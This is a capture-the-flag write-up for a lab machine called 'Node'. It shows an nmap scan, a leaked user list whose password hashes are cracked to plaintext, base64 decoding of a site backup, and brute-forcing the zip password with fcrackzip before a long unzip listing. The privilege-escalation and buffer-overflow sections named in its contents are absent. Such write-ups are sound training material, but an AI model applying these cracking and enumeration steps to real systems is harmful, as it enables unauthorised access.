#### Node

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-rnumeration)
- [Source Backup](#source-backup)
- [SSH Access using MongoDB password](#ssh-access-using-mongodb-password)
- [Privilege Escalation](#privilege-escalation)
- [Binary Exploitation](#binary-exploitation)
- [Method 1 - Abusing CWD](#method-1-abusing-cwd)
- [Method 2 - Wildcards to bypass blacklist](#method-2-wildcards-to-bypass-blacklist)
- [Method 3 - Command injection via new line](#method-3-command-injection-via-new-line)
- [Method 4 - Buffer Overflow](#method-4-buffer-overflow)

###### Attacker Info

```sh
root@kali:~/node# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 86276sec preferred_lft 86276sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::f7fa:3b26:6023:ec2c/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/node#
```

###### Nmap Scan

```sh
root@kali:~/node# nmap -sC -sV -oA node.nmap 10.10.10.58
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-04 12:34 EDT
Nmap scan report for 10.10.10.58
Host is up (0.22s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  http    Node.js Express framework
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.38 seconds
root@kali:~/node#
```

###### Web Enumeration

```
http://10.10.10.58:3000/
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

```json
[
	{
		"_id": "59a7365b98aa325cc03ee51c",
		"username": "myP14ceAdm1nAcc0uNT",
		"password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
		"is_admin": true
	},
	{
		"_id": "59a7368398aa325cc03ee51d",
		"username": "tom",
		"password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
		"is_admin": false
	},
	{
		"_id": "59a7368e98aa325cc03ee51e",
		"username": "mark",
		"password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
		"is_admin": false
	},
	{
		"_id": "59aa9781cced6f1d1490fce9",
		"username": "rastating",
		"password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
		"is_admin": false
	}
]
```

![](images/10.png)

![](images/11.png)

![](images/12.png)

```
SHA256PLAIN dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
SHA256PLAIN f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
SHA256PLAIN de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
```

![](images/13.png)

![](images/14.png)

###### Source Backup

```sh
root@kali:~/node# file myplace.backup
myplace.backup: ASCII text, with very long lines, with no line terminators
root@kali:~/node#
```

```sh
root@kali:~/node# base64 -d myplace.backup > myplace.backup.decode
```

```sh
root@kali:~/node# file myplace.backup.decode
myplace.backup.decode: Zip archive data, at least v1.0 to extract
root@kali:~/node#
```

```sh
root@kali:~/node# unzip myplace.backup.decode
Archive:  myplace.backup.decode
   creating: var/www/myplace/
[myplace.backup.decode] var/www/myplace/package-lock.json password: 
root@kali:~/node#
```

```sh
root@kali:~/node# fcrackzip -b -p /usr/share/wordlists/rockyou.txt backup-node.zip -D
possible pw found: magicword ()
root@kali:~/node#
```

```sh
root@kali:~/node# unzip backup-node.zip
Archive:  backup-node.zip
[backup-node.zip] var/www/myplace/package-lock.json password:
  inflating: var/www/myplace/package-lock.json
   creating: var/www/myplace/node_modules/
   creating: var/www/myplace/node_modules/serve-static/
  inflating: var/www/myplace/node_modules/serve-static/README.md
  inflating: var/www/myplace/node_modules/serve-static/index.js
  inflating: var/www/myplace/node_modules/serve-static/LICENSE
  inflating: var/www/myplace/node_modules/serve-static/HISTORY.md
  inflating: var/www/myplace/node_modules/serve-static/package.json
   creating: var/www/myplace/node_modules/utils-merge/
  inflating: var/www/myplace/node_modules/utils-merge/README.md
  inflating: var/www/myplace/node_modules/utils-merge/index.js
  inflating: var/www/myplace/node_modules/utils-merge/LICENSE
  inflating: var/www/myplace/node_modules/utils-merge/.travis.yml
  inflating: var/www/myplace/node_modules/utils-merge/package.json
   creating: var/www/myplace/node_modules/qs/
  inflating: var/www/myplace/node_modules/qs/CHANGELOG.md
  inflating: var/www/myplace/node_modules/qs/README.md
   creating: var/www/myplace/node_modules/qs/test/
  inflating: var/www/myplace/node_modules/qs/test/index.js
  inflating: var/www/myplace/node_modules/qs/test/stringify.js
  inflating: var/www/myplace/node_modules/qs/test/.eslintrc
  inflating: var/www/myplace/node_modules/qs/test/parse.js
  inflating: var/www/myplace/node_modules/qs/test/utils.js
  inflating: var/www/myplace/node_modules/qs/LICENSE
   creating: var/www/myplace/node_modules/qs/dist/
  inflating: var/www/myplace/node_modules/qs/dist/qs.js
 extracting: var/www/myplace/node_modules/qs/.eslintignore
   creating: var/www/myplace/node_modules/qs/lib/
  inflating: var/www/myplace/node_modules/qs/lib/index.js
  inflating: var/www/myplace/node_modules/qs/lib/stringify.js
  inflating: var/www/myplace/node_modules/qs/lib/parse.js
  inflating: var/www/myplace/node_modules/qs/lib/formats.js
  inflating: var/www/myplace/node_modules/qs/lib/utils.js
  inflating: var/www/myplace/node_modules/qs/.eslintrc
  inflating: var/www/myplace/node_modules/qs/package.json
  inflating: var/www/myplace/node_modules/qs/.jscs.json
   creating: var/www/myplace/node_modules/iconv-lite/
  inflating: var/www/myplace/node_modules/iconv-lite/README.md
  inflating: var/www/myplace/node_modules/iconv-lite/LICENSE
   creating: var/www/myplace/node_modules/iconv-lite/lib/
  inflating: var/www/myplace/node_modules/iconv-lite/lib/index.js
  inflating: var/www/myplace/node_modules/iconv-lite/lib/streams.js
  inflating: var/www/myplace/node_modules/iconv-lite/lib/index.d.ts
  inflating: var/www/myplace/node_modules/iconv-lite/lib/extend-node.js
  inflating: var/www/myplace/node_modules/iconv-lite/lib/bom-handling.js
  inflating: var/www/myplace/node_modules/iconv-lite/.travis.yml
  inflating: var/www/myplace/node_modules/iconv-lite/package.json
 extracting: var/www/myplace/node_modules/iconv-lite/.npmignore
   creating: var/www/myplace/node_modules/iconv-lite/encodings/
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/utf7.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/index.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-data-generated.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/dbcs-codec.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/dbcs-data.js
   creating: var/www/myplace/node_modules/iconv-lite/encodings/tables/
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/gbk-added.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/big5-added.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/gb18030-ranges.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp936.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp949.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp950.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/shiftjis.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/eucjp.json
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/utf16.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/internal.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-data.js
  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-codec.js
  inflating: var/www/myplace/node_modules/iconv-lite/Changelog.md
   creating: var/www/myplace/node_modules/debug/
  inflating: var/www/myplace/node_modules/debug/CHANGELOG.md
  inflating: var/www/myplace/node_modules/debug/README.md
 extracting: var/www/myplace/node_modules/debug/node.js
  inflating: var/www/myplace/node_modules/debug/LICENSE
  inflating: var/www/myplace/node_modules/debug/.eslintrc
  inflating: var/www/myplace/node_modules/debug/component.json
  inflating: var/www/myplace/node_modules/debug/.travis.yml
  inflating: var/www/myplace/node_modules/debug/package.json
  inflating: var/www/myplace/node_modules/debug/Makefile
   creating: var/www/myplace/node_modules/debug/src/
  inflating: var/www/myplace/node_modules/debug/src/index.js
  inflating: var/www/myplace/node_modules/debug/src/node.js
  inflating: var/www/myplace/node_modules/debug/src/debug.js
  inflating: var/www/myplace/node_modules/debug/src/browser.js
 extracting: var/www/myplace/node_modules/debug/.coveralls.yml
  inflating: var/www/myplace/node_modules/debug/.npmignore
  inflating: var/www/myplace/node_modules/debug/karma.conf.js
   creating: var/www/myplace/node_modules/array-flatten/
  inflating: var/www/myplace/node_modules/array-flatten/README.md
  inflating: var/www/myplace/node_modules/array-flatten/array-flatten.js
  inflating: var/www/myplace/node_modules/array-flatten/LICENSE
  inflating: var/www/myplace/node_modules/array-flatten/package.json
   creating: var/www/myplace/node_modules/statuses/
  inflating: var/www/myplace/node_modules/statuses/README.md
  inflating: var/www/myplace/node_modules/statuses/index.js
  inflating: var/www/myplace/node_modules/statuses/LICENSE
  inflating: var/www/myplace/node_modules/statuses/HISTORY.md
  inflating: var/www/myplace/node_modules/statuses/codes.json
  inflating: var/www/myplace/node_modules/statuses/package.json
   creating: var/www/myplace/node_modules/ms/
  inflating: var/www/myplace/node_modules/ms/index.js
  inflating: var/www/myplace/node_modules/ms/license.md
  inflating: var/www/myplace/node_modules/ms/package.json
  inflating: var/www/myplace/node_modules/ms/readme.md
   creating: var/www/myplace/node_modules/escape-html/
  inflating: var/www/myplace/node_modules/escape-html/Readme.md
  inflating: var/www/myplace/node_modules/escape-html/index.js
  inflating: var/www/myplace/node_modules/escape-html/LICENSE
  inflating: var/www/myplace/node_modules/escape-html/package.json
   creating: var/www/myplace/node_modules/merge-descriptors/
  inflating: var/www/myplace/node_modules/merge-descriptors/README.md
  inflating: var/www/myplace/node_modules/merge-descriptors/index.js
  inflating: var/www/myplace/node_modules/merge-descriptors/LICENSE
  inflating: var/www/myplace/node_modules/merge-descriptors/HISTORY.md
  inflating: var/www/myplace/node_modules/merge-descriptors/package.json
   creating: var/www/myplace/node_modules/media-typer/
  inflating: var/www/myplace/node_modules/media-typer/README.md
  inflating: var/www/myplace/node_modules/media-typer/index.js
  inflating: var/www/myplace/node_modules/media-typer/LICENSE
  inflating: var/www/myplace/node_modules/media-typer/HISTORY.md
  inflating: var/www/myplace/node_modules/media-typer/package.json
   creating: var/www/myplace/node_modules/etag/
  inflating: var/www/myplace/node_modules/etag/README.md
  inflating: var/www/myplace/node_modules/etag/index.js
  inflating: var/www/myplace/node_modules/etag/LICENSE
  inflating: var/www/myplace/node_modules/etag/HISTORY.md
  inflating: var/www/myplace/node_modules/etag/package.json
   creating: var/www/myplace/node_modules/cookie-signature/
  inflating: var/www/myplace/node_modules/cookie-signature/History.md
  inflating: var/www/myplace/node_modules/cookie-signature/Readme.md
  inflating: var/www/myplace/node_modules/cookie-signature/index.js
  inflating: var/www/myplace/node_modules/cookie-signature/package.json
 extracting: var/www/myplace/node_modules/cookie-signature/.npmignore
   creating: var/www/myplace/node_modules/methods/
  inflating: var/www/myplace/node_modules/methods/README.md
  inflating: var/www/myplace/node_modules/methods/index.js
  inflating: var/www/myplace/node_modules/methods/LICENSE
  inflating: var/www/myplace/node_modules/methods/HISTORY.md
  inflating: var/www/myplace/node_modules/methods/package.json
   creating: var/www/myplace/node_modules/finalhandler/
  inflating: var/www/myplace/node_modules/finalhandler/README.md
  inflating: var/www/myplace/node_modules/finalhandler/index.js
  inflating: var/www/myplace/node_modules/finalhandler/LICENSE
   creating: var/www/myplace/node_modules/finalhandler/node_modules/
   creating: var/www/myplace/node_modules/finalhandler/node_modules/debug/
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/CHANGELOG.md
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/README.md
 extracting: var/www/myplace/node_modules/finalhandler/node_modules/debug/node.js
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/LICENSE
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.eslintrc
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/component.json
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.travis.yml
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/package.json
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/Makefile
   creating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/index.js
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/node.js
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/debug.js
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/browser.js
 extracting: var/www/myplace/node_modules/finalhandler/node_modules/debug/.coveralls.yml
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.npmignore
  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/karma.conf.js
  inflating: var/www/myplace/node_modules/finalhandler/HISTORY.md
  inflating: var/www/myplace/node_modules/finalhandler/package.json
   creating: var/www/myplace/node_modules/require_optional/
  inflating: var/www/myplace/node_modules/require_optional/README.md
   creating: var/www/myplace/node_modules/require_optional/test/
  inflating: var/www/myplace/node_modules/require_optional/test/require_optional_tests.js
   creating: var/www/myplace/node_modules/require_optional/test/nestedTest/
  inflating: var/www/myplace/node_modules/require_optional/test/nestedTest/index.js
  inflating: var/www/myplace/node_modules/require_optional/test/nestedTest/package.json
  inflating: var/www/myplace/node_modules/require_optional/index.js
  inflating: var/www/myplace/node_modules/require_optional/LICENSE
  inflating: var/www/myplace/node_modules/require_optional/HISTORY.md
  inflating: var/www/myplace/node_modules/require_optional/.travis.yml
  inflating: var/www/myplace/node_modules/require_optional/package.json
  inflating: var/www/myplace/node_modules/require_optional/.npmignore
   creating: var/www/myplace/node_modules/unpipe/
  inflating: var/www/myplace/node_modules/unpipe/README.md
  inflating: var/www/myplace/node_modules/unpipe/index.js
  inflating: var/www/myplace/node_modules/unpipe/LICENSE
  inflating: var/www/myplace/node_modules/unpipe/HISTORY.md
  inflating: var/www/myplace/node_modules/unpipe/package.json
   creating: var/www/myplace/node_modules/cookie/
  inflating: var/www/myplace/node_modules/cookie/README.md
  inflating: var/www/myplace/node_modules/cookie/index.js
  inflating: var/www/myplace/node_modules/cookie/LICENSE
  inflating: var/www/myplace/node_modules/cookie/HISTORY.md
  inflating: var/www/myplace/node_modules/cookie/package.json
   creating: var/www/myplace/node_modules/express/
  inflating: var/www/myplace/node_modules/express/History.md
  inflating: var/www/myplace/node_modules/express/Readme.md
  inflating: var/www/myplace/node_modules/express/index.js
  inflating: var/www/myplace/node_modules/express/LICENSE
   creating: var/www/myplace/node_modules/express/node_modules/
   creating: var/www/myplace/node_modules/express/node_modules/qs/
  inflating: var/www/myplace/node_modules/express/node_modules/qs/CHANGELOG.md
  inflating: var/www/myplace/node_modules/express/node_modules/qs/README.md
   creating: var/www/myplace/node_modules/express/node_modules/qs/test/
  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/index.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/stringify.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/.eslintrc
  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/parse.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/utils.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/LICENSE
   creating: var/www/myplace/node_modules/express/node_modules/qs/dist/
  inflating: var/www/myplace/node_modules/express/node_modules/qs/dist/qs.js
 extracting: var/www/myplace/node_modules/express/node_modules/qs/.eslintignore
   creating: var/www/myplace/node_modules/express/node_modules/qs/lib/
  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/index.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/stringify.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/parse.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/formats.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/utils.js
  inflating: var/www/myplace/node_modules/express/node_modules/qs/.eslintrc
  inflating: var/www/myplace/node_modules/express/node_modules/qs/package.json
  inflating: var/www/myplace/node_modules/express/node_modules/qs/.editorconfig
   creating: var/www/myplace/node_modules/express/node_modules/debug/
  inflating: var/www/myplace/node_modules/express/node_modules/debug/CHANGELOG.md
  inflating: var/www/myplace/node_modules/express/node_modules/debug/README.md
 extracting: var/www/myplace/node_modules/express/node_modules/debug/node.js
  inflating: var/www/myplace/node_modules/express/node_modules/debug/LICENSE
  inflating: var/www/myplace/node_modules/express/node_modules/debug/.eslintrc
  inflating: var/www/myplace/node_modules/express/node_modules/debug/component.json
  inflating: var/www/myplace/node_modules/express/node_modules/debug/.travis.yml
  inflating: var/www/myplace/node_modules/express/node_modules/debug/package.json
  inflating: var/www/myplace/node_modules/express/node_modules/debug/Makefile
   creating: var/www/myplace/node_modules/express/node_modules/debug/src/
  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/index.js
  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/node.js
  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/debug.js
  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/browser.js
 extracting: var/www/myplace/node_modules/express/node_modules/debug/.coveralls.yml
  inflating: var/www/myplace/node_modules/express/node_modules/debug/.npmignore
  inflating: var/www/myplace/node_modules/express/node_modules/debug/karma.conf.js
   creating: var/www/myplace/node_modules/express/lib/
  inflating: var/www/myplace/node_modules/express/lib/response.js
  inflating: var/www/myplace/node_modules/express/lib/view.js
  inflating: var/www/myplace/node_modules/express/lib/utils.js
  inflating: var/www/myplace/node_modules/express/lib/request.js
  inflating: var/www/myplace/node_modules/express/lib/application.js
  inflating: var/www/myplace/node_modules/express/lib/express.js
   creating: var/www/myplace/node_modules/express/lib/router/
  inflating: var/www/myplace/node_modules/express/lib/router/index.js
  inflating: var/www/myplace/node_modules/express/lib/router/layer.js
  inflating: var/www/myplace/node_modules/express/lib/router/route.js
   creating: var/www/myplace/node_modules/express/lib/middleware/
  inflating: var/www/myplace/node_modules/express/lib/middleware/query.js
  inflating: var/www/myplace/node_modules/express/lib/middleware/init.js
  inflating: var/www/myplace/node_modules/express/package.json
   creating: var/www/myplace/node_modules/mime-types/
  inflating: var/www/myplace/node_modules/mime-types/README.md
  inflating: var/www/myplace/node_modules/mime-types/index.js
  inflating: var/www/myplace/node_modules/mime-types/LICENSE
  inflating: var/www/myplace/node_modules/mime-types/HISTORY.md
  inflating: var/www/myplace/node_modules/mime-types/package.json
   creating: var/www/myplace/node_modules/safe-buffer/
  inflating: var/www/myplace/node_modules/safe-buffer/README.md
  inflating: var/www/myplace/node_modules/safe-buffer/index.js
  inflating: var/www/myplace/node_modules/safe-buffer/LICENSE
  inflating: var/www/myplace/node_modules/safe-buffer/test.js
  inflating: var/www/myplace/node_modules/safe-buffer/.travis.yml
  inflating: var/www/myplace/node_modules/safe-buffer/package.json
   creating: var/www/myplace/node_modules/depd/
  inflating: var/www/myplace/node_modules/depd/History.md
  inflating: var/www/myplace/node_modules/depd/Readme.md
  inflating: var/www/myplace/node_modules/depd/index.js
  inflating: var/www/myplace/node_modules/depd/LICENSE
   creating: var/www/myplace/node_modules/depd/lib/
   creating: var/www/myplace/node_modules/depd/lib/compat/
  inflating: var/www/myplace/node_modules/depd/lib/compat/event-listener-count.js
  inflating: var/www/myplace/node_modules/depd/lib/compat/index.js
  inflating: var/www/myplace/node_modules/depd/lib/compat/callsite-tostring.js
   creating: var/www/myplace/node_modules/depd/lib/browser/
  inflating: var/www/myplace/node_modules/depd/lib/browser/index.js
  inflating: var/www/myplace/node_modules/depd/package.json
   creating: var/www/myplace/node_modules/readable-stream/
  inflating: var/www/myplace/node_modules/readable-stream/readable-browser.js
  inflating: var/www/myplace/node_modules/readable-stream/CONTRIBUTING.md
  inflating: var/www/myplace/node_modules/readable-stream/README.md
  inflating: var/www/myplace/node_modules/readable-stream/LICENSE
   creating: var/www/myplace/node_modules/readable-stream/lib/
  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_writable.js
  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_readable.js
  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_duplex.js
  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_passthrough.js
   creating: var/www/myplace/node_modules/readable-stream/lib/internal/
   creating: var/www/myplace/node_modules/readable-stream/lib/internal/streams/
  inflating: var/www/myplace/node_modules/readable-stream/lib/internal/streams/BufferList.js
  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_transform.js
 extracting: var/www/myplace/node_modules/readable-stream/writable-browser.js
  inflating: var/www/myplace/node_modules/readable-stream/readable.js
  inflating: var/www/myplace/node_modules/readable-stream/writable.js
 extracting: var/www/myplace/node_modules/readable-stream/passthrough.js
  inflating: var/www/myplace/node_modules/readable-stream/.travis.yml
  inflating: var/www/myplace/node_modules/readable-stream/package.json
 extracting: var/www/myplace/node_modules/readable-stream/transform.js
  inflating: var/www/myplace/node_modules/readable-stream/.npmignore
 extracting: var/www/myplace/node_modules/readable-stream/duplex.js
 extracting: var/www/myplace/node_modules/readable-stream/duplex-browser.js
   creating: var/www/myplace/node_modules/readable-stream/doc/
   creating: var/www/myplace/node_modules/readable-stream/doc/wg-meetings/
  inflating: var/www/myplace/node_modules/readable-stream/doc/wg-meetings/2015-01-30.md
  inflating: var/www/myplace/node_modules/readable-stream/GOVERNANCE.md
   creating: var/www/myplace/node_modules/express-session/
  inflating: var/www/myplace/node_modules/express-session/README.md
  inflating: var/www/myplace/node_modules/express-session/index.js
  inflating: var/www/myplace/node_modules/express-session/LICENSE
   creating: var/www/myplace/node_modules/express-session/node_modules/
   creating: var/www/myplace/node_modules/express-session/node_modules/debug/
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/CHANGELOG.md
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/README.md
 extracting: var/www/myplace/node_modules/express-session/node_modules/debug/node.js
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/LICENSE
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.eslintrc
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/component.json
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.travis.yml
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/package.json
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/Makefile
   creating: var/www/myplace/node_modules/express-session/node_modules/debug/src/
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/index.js
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/node.js
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/debug.js
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/browser.js
 extracting: var/www/myplace/node_modules/express-session/node_modules/debug/.coveralls.yml
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.npmignore
  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/karma.conf.js
  inflating: var/www/myplace/node_modules/express-session/HISTORY.md
   creating: var/www/myplace/node_modules/express-session/session/
  inflating: var/www/myplace/node_modules/express-session/session/cookie.js
  inflating: var/www/myplace/node_modules/express-session/session/store.js
  inflating: var/www/myplace/node_modules/express-session/session/memory.js
  inflating: var/www/myplace/node_modules/express-session/session/session.js
  inflating: var/www/myplace/node_modules/express-session/package.json
   creating: var/www/myplace/node_modules/mime/
  inflating: var/www/myplace/node_modules/mime/README.md
  inflating: var/www/myplace/node_modules/mime/LICENSE
  inflating: var/www/myplace/node_modules/mime/types.json
   creating: var/www/myplace/node_modules/mime/build/
  inflating: var/www/myplace/node_modules/mime/build/test.js
  inflating: var/www/myplace/node_modules/mime/build/build.js
  inflating: var/www/myplace/node_modules/mime/cli.js
  inflating: var/www/myplace/node_modules/mime/package.json
  inflating: var/www/myplace/node_modules/mime/mime.js
 extracting: var/www/myplace/node_modules/mime/.npmignore
   creating: var/www/myplace/node_modules/util-deprecate/
  inflating: var/www/myplace/node_modules/util-deprecate/History.md
  inflating: var/www/myplace/node_modules/util-deprecate/README.md
  inflating: var/www/myplace/node_modules/util-deprecate/node.js
  inflating: var/www/myplace/node_modules/util-deprecate/LICENSE
  inflating: var/www/myplace/node_modules/util-deprecate/browser.js
  inflating: var/www/myplace/node_modules/util-deprecate/package.json
   creating: var/www/myplace/node_modules/.bin/
  inflating: var/www/myplace/node_modules/.bin/mime
  inflating: var/www/myplace/node_modules/.bin/semver
   creating: var/www/myplace/node_modules/ee-first/
  inflating: var/www/myplace/node_modules/ee-first/README.md
  inflating: var/www/myplace/node_modules/ee-first/index.js
  inflating: var/www/myplace/node_modules/ee-first/LICENSE
  inflating: var/www/myplace/node_modules/ee-first/package.json
   creating: var/www/myplace/node_modules/range-parser/
  inflating: var/www/myplace/node_modules/range-parser/README.md
  inflating: var/www/myplace/node_modules/range-parser/index.js
  inflating: var/www/myplace/node_modules/range-parser/LICENSE
  inflating: var/www/myplace/node_modules/range-parser/HISTORY.md
  inflating: var/www/myplace/node_modules/range-parser/package.json
   creating: var/www/myplace/node_modules/ipaddr.js/
  inflating: var/www/myplace/node_modules/ipaddr.js/README.md
   creating: var/www/myplace/node_modules/ipaddr.js/test/
  inflating: var/www/myplace/node_modules/ipaddr.js/test/ipaddr.test.coffee
  inflating: var/www/myplace/node_modules/ipaddr.js/LICENSE
   creating: var/www/myplace/node_modules/ipaddr.js/lib/
  inflating: var/www/myplace/node_modules/ipaddr.js/lib/ipaddr.js
  inflating: var/www/myplace/node_modules/ipaddr.js/.travis.yml
  inflating: var/www/myplace/node_modules/ipaddr.js/package.json
  inflating: var/www/myplace/node_modules/ipaddr.js/Cakefile
   creating: var/www/myplace/node_modules/ipaddr.js/src/
  inflating: var/www/myplace/node_modules/ipaddr.js/src/ipaddr.coffee
  inflating: var/www/myplace/node_modules/ipaddr.js/ipaddr.min.js
  inflating: var/www/myplace/node_modules/ipaddr.js/bower.json
 extracting: var/www/myplace/node_modules/ipaddr.js/.npmignore
   creating: var/www/myplace/node_modules/string_decoder/
  inflating: var/www/myplace/node_modules/string_decoder/README.md
  inflating: var/www/myplace/node_modules/string_decoder/LICENSE
   creating: var/www/myplace/node_modules/string_decoder/lib/
  inflating: var/www/myplace/node_modules/string_decoder/lib/string_decoder.js
  inflating: var/www/myplace/node_modules/string_decoder/package.json
 extracting: var/www/myplace/node_modules/string_decoder/.npmignore
   creating: var/www/myplace/node_modules/content-disposition/
  inflating: var/www/myplace/node_modules/content-disposition/README.md
  inflating: var/www/myplace/node_modules/content-disposition/index.js
  inflating: var/www/myplace/node_modules/content-disposition/LICENSE
  inflating: var/www/myplace/node_modules/content-disposition/HISTORY.md
  inflating: var/www/myplace/node_modules/content-disposition/package.json
   creating: var/www/myplace/node_modules/negotiator/
  inflating: var/www/myplace/node_modules/negotiator/README.md
  inflating: var/www/myplace/node_modules/negotiator/index.js
  inflating: var/www/myplace/node_modules/negotiator/LICENSE
  inflating: var/www/myplace/node_modules/negotiator/HISTORY.md
   creating: var/www/myplace/node_modules/negotiator/lib/
  inflating: var/www/myplace/node_modules/negotiator/lib/charset.js
  inflating: var/www/myplace/node_modules/negotiator/lib/language.js
  inflating: var/www/myplace/node_modules/negotiator/lib/mediaType.js
  inflating: var/www/myplace/node_modules/negotiator/lib/encoding.js
  inflating: var/www/myplace/node_modules/negotiator/package.json
   creating: var/www/myplace/node_modules/on-headers/
  inflating: var/www/myplace/node_modules/on-headers/README.md
  inflating: var/www/myplace/node_modules/on-headers/index.js
  inflating: var/www/myplace/node_modules/on-headers/LICENSE
  inflating: var/www/myplace/node_modules/on-headers/HISTORY.md
  inflating: var/www/myplace/node_modules/on-headers/package.json
   creating: var/www/myplace/node_modules/inherits/
  inflating: var/www/myplace/node_modules/inherits/README.md
  inflating: var/www/myplace/node_modules/inherits/LICENSE
  inflating: var/www/myplace/node_modules/inherits/package.json
